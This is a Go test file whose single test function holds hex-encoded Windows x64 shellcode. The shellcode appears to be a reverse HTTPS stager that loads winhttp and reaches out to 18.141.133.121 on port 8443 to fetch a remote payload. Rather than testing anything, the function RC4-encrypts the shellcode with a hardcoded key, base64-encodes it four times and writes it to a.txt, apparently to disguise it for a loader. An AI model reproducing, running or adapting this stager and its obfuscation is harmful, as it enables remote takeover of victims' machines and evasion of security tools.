package env

import (
	"crypto/rc4"
	"encoding/base64"
	"os"
	"testing"
)

func TestName(t *testing.T) {
	v := "fc4883e4f0e8cc0000004151415052514831d25665488b5260488b5218488b5220480fb74a4a4d31c9488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed52488b52208b423c4801d04151668178180b020f85720000008b80880000004885c074674801d08b481850448b40204901d0e3564d31c948ffc9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d4831db5349be77696e687474700041564889e149c7c24c772607ffd55349be637279707433320041564889e149c7c24c772607ffd553534889e1535a4d31c04d31c9535349ba041f9dbb00000000ffd54989c4e81e000000310038002e003100340031002e003100330033002e0031003200310000005a4889c149c7c0fb2000004d31c949ba469b1ec200000000ffd5e8d6010000680074007400700073003a002f002f00310038002e003100340031002e003100330033002e003100320031003a0038003400340033002f003200300034002f003100660055004e004600760064006b005500790033006200440039006f004e0075004a0061006d00360067006a0032002d007700500036007a0031002d004f00730055007a00340050004900570076005f004c006700440067007700480038002d0059004f006600700072005500750050007a004e003000720075007200770057006e0070007200630053005a005400790037004e0079007200560056007a004c0061004300410074005100720041006e0079004f0077005900480046005900710030003200420035006a006900450035006b005500440049007300590079004200790053006800650050002d0058004b00360048004a00390043004300520064006f0069003300570037006f0043005000790068006300560062004d004f00530035007100500045004600510038006800540063003400520073002d00490057006c007100520051003500720057006100770054006f0055004300320062004a006b006c00420032004400680051003400470073005a0075002d00680057004e00680041007100490045003600670070004b0000004889c1535a41584d89c54983c0364d31c95348c7c00001800050535349c7c29810b35bffd54889c64883e8204889e74889f949c7c221a70b60ffd585c00f846d000000488b470885c0743a4889d948ffc148c1e12051535048b80300000003000000504989e04883ec204889e74989f94c89e14c89ea49c7c2daddea49ffd585c0742deb12488b471085c074234883c7086a03584889074989f86a1841594889f16a265a49bad3589dce00000000ffd56a0a5f4889f16a1f5a5268003300004989e06a04415949bad3589dce00000000ffd54d31c0535a4889f14d31c95353535349ba9558bb9100000000ffd585c0750c48ffcf7402ebbbe8de0000004889f1535a49c7c205889d70ffd585c074e94889f16a4e5a4989e04d89c6536a084989e149c7c278042f27ffd585c074ca498b0e6a184989e14989e7492b214989e04d89c66a035a49ba2d6ea9c300000000ffd585c00f849fffffffe814000000d0e0a459492000d3f348c9d19f5db6522e0aa6ea5848964c89f7498b0ff3a60f8575ffffff489653596a405a4989d1c1e21049c7c00010000049ba58a453e500000000ffd5489353534889e74889f14889da49c7c0002000004989f949c7c26c29247effd54883c42085c00f8429ffffff668b074801c385c075d158c3586a005949c7c2f0b5a256ffd5;"
	c, _ := rc4.NewCipher([]byte("R8Q#ve^HXd#GD^uHI^S%fBPRNckI2bqZTphB3cfItcCU!nTyTLP8EsR^h(KdDu)z"))
	d := make([]byte, len(v))
	c.XORKeyStream(d, []byte(v))
	a := ""
	for i := 0; i < 4; i++ {
		if i == 0 {
			a = base64.StdEncoding.EncodeToString(d)
		} else {
			a = base64.StdEncoding.EncodeToString([]byte(a))
		}
	}
	f, _ := os.OpenFile("a.txt", os.O_CREATE|os.O_WRONLY, 0666)
	f.Write([]byte(a))
	f.Close()
}